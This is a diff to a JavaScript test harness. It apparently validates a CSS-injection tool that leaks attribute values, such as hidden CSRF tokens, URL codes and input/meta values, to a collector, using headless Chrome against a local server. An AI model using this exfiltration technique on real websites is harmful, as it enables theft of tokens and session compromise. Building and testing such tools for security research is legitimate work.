@@ -23,7 +23,7 @@ function targeted(name, cfg, value, html) {
   cases.push({ name, html, build(origin) {
     const css = P.generateCSS(cfg, origin);
     const expected = new Set(leak(parsePayload(css), value).requests.map(r => (r.t === 'm' ? '' : r.t + '/') + r.c));
-    return { css, expected };
+    return { css, expected, probeCount: 16 ** cfg.windowSize + 2 * 16 ** P.ANCHOR_LENGTH };
   } });
 }
 
@@ -71,6 +71,35 @@ targeted('escaped attribute context', { selector: 'a', attribute: 'href', tag: '
   startContext: '"\\', endContext: '\n&' }, quoted, `<a href="${escapeHTML(quoted)}">target</a>`);
 targeted('repeated fragments', { selector: 'a', attribute: 'href', tag: 'a', windowSize: 4,
   useStartsWith: true, useEndsWith: true }, 'abababababab', '<a href="abababababab">target</a>');
+for (const windowSize of [3, 4]) {
+  // Includes properties whose compact names contain underscores and the
+  // boundary between two- and three-character names.
+  const value = '003e0fbe0fbf0fc0abcdef';
+  targeted(`compact property boundaries ${windowSize}`, { selector: 'a', attribute: 'href', tag: 'a',
+    windowSize, useStartsWith: true, useEndsWith: true }, value, `<a href="${value}">target</a>`);
+}
+
+for (const value of ['?x=dead&CODE=abcdef012345#fragment', '?code=1234&CODE=abcdef&code=5678']) {
+  blind('URL separators and case: ' + value, [{ id: 0, kind: 'a', name: 'code', host: 'self', windowSize: 3 }],
+    `<a href="${escapeHTML(value)}">host</a>`, page([el('a', { href: value })]));
+}
+
+const reconElements = [];
+const reconMarkup = [];
+const reconValues = ['abcdef0123', '', 'ABCDEF', 'abcxyz', 'ab&cd', '01_ab', '123456'];
+for (const [tag, names, attr] of [['input', B.INPUT_NAMES, 'value'], ['meta', B.META_NAMES, 'content']]) {
+  names.forEach((name, i) => {
+    const attrs = { name: i % 2 ? name.toUpperCase() : name, [attr]: reconValues[i % reconValues.length] };
+    if (tag === 'input') attrs.type = 'hidden';
+    reconElements.push(el(tag, attrs));
+    reconMarkup.push(`<${tag} ${Object.entries(attrs).map(([a, v]) => `${a}="${escapeHTML(v)}"`).join(' ')}>`);
+  });
+}
+blind('recon all input/meta names with mixed values', [], reconMarkup.join(''), page(reconElements), true);
+
+targeted('localhost collector with same-origin CSP', { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3,
+  useStartsWith: true, useEndsWith: true }, secret, `<a href="${secret}">target</a>`);
+Object.assign(cases[cases.length - 1], { hostname: 'localhost', csp: "img-src 'self'" });
 
 const form = el('form');
 const both = `<form><input type="hidden" name="csrf" value="${secret}">` +
@@ -116,6 +145,7 @@ async function main() {
     res.setHeader('Cache-Control', 'no-store');
     if (req.url === '/fixture') {
       res.setHeader('Content-Type', 'text/html; charset=utf-8');
+      if (active.csp) res.setHeader('Content-Security-Policy', active.csp);
       return res.end(`<!doctype html><html><head>${active.css}</head><body>${active.html}</body></html>`);
     }
     if (req.url !== '/favicon.ico') active.hits.add(req.url.slice(1));
@@ -125,7 +155,7 @@ async function main() {
   try {
     server.listen(0, '127.0.0.1');
     await once(server, 'listening');
-    const origin = `http://localhost:${server.address().port}`;
+    const origin = `http://127.0.0.1:${server.address().port}`;
     chrome = spawn(executable, ['--headless=new', '--no-first-run', '--no-default-browser-check',
       '--disable-background-networking', '--disable-component-update', '--disable-sync',
       '--remote-debugging-pipe', `--user-data-dir=${profile}`], { stdio: ['ignore', 'ignore', 'pipe', 'pipe', 'pipe'] });
@@ -168,7 +198,8 @@ async function main() {
     });
     console.log((await send('Browser.getVersion')).product);
     for (const fixture of cases) {
-      active = { ...fixture, ...fixture.build(origin), hits: new Set() };
+      const fixtureOrigin = fixture.hostname ? `http://${fixture.hostname}:${server.address().port}` : origin;
+      active = { ...fixture, ...fixture.build(fixtureOrigin), hits: new Set() };
       const { targetId } = await send('Target.createTarget', { url: 'about:blank' });
       const { sessionId } = await send('Target.attachToTarget', { targetId, flatten: true });
       await send('Page.enable', {}, sessionId);
@@ -177,7 +208,7 @@ async function main() {
         const timer = setTimeout(() => { listeners.delete(key); reject(new Error(`Page timed out: ${fixture.name}`)); }, 60000);
         listeners.set(key, () => { clearTimeout(timer); resolve(); });
       });
-      await send('Page.navigate', { url: `http://127.0.0.1:${server.address().port}/fixture` }, sessionId);
+      await send('Page.navigate', { url: fixtureOrigin + '/fixture' }, sessionId);
       await loaded;
       const { result, exceptionDetails } = await send('Runtime.evaluate', { returnByValue: true, expression: `(() => {
         let probes = 0;
